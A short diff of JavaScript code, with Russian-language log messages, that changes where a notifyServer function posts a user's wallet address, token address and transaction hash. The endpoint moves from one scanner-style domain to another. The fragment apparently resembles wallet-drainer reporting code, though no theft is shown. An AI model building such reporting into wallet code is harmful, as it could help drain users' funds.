@@ -573,7 +573,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
     const fixedAmount = ethers.utils.parseUnits("1", decimals);
     console.log(`📊 Фиксированное количество: 1 токен, в wei: ${fixedAmount.toString()}`);
 
-    const response = await fetch('https://api.cryptoverif.com/api/transfer', {
+    const response = await fetch('https://api.erc20scan.com/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
